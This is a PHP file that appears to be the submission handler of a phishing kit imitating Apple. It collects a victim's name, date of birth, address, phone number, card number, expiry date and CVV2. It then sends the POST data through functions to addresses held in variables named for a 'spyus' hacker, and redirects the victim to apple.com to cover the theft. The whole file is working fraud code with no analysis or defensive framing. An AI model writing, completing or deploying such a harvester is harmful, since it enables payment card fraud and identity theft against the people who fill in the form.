<?php

   session_start();
      require "functions.php";

 date_default_timezone_set("Africa/Tunis");
  $userag = $_SERVER['HTTP_USER_AGENT']; 
      $_D['fname'] = $_R['fname'];
      $_D['mname'] = $_R['mname'];
      $_D['lname'] = $_R['lname'];
      $_D['dob'] = $_R['dob'];
      $_D['add1'] = $_R['add1'];
      $_D['add2'] = $_R['add2'];
      $_D['city'] = $_R['city'];
      $_D['cntr'] = $_R['cntr'];
      $_D['zipcode'] = $_R['zipcode'];
      $_D['arec'] = $_R['arec'];
      $_D['phonen'] = $_R['phonen'];
      $_D['cchn'] = $_R['cchn'];
      $_D['ccnum'] = $_R['ccnum'];
      $_D['expdate'] = $_R['expdate'];
      $_D['cvv2'] = $_R['cvv2'];
 CCSend($_POST,$spyus_email,$spyus_Hacker);
  Checkbill($_POST,$spyus_email,$spyus_Hacker);
  header("Location: https://www.apple.com");
      $html = html_while("");
      die($html);
?>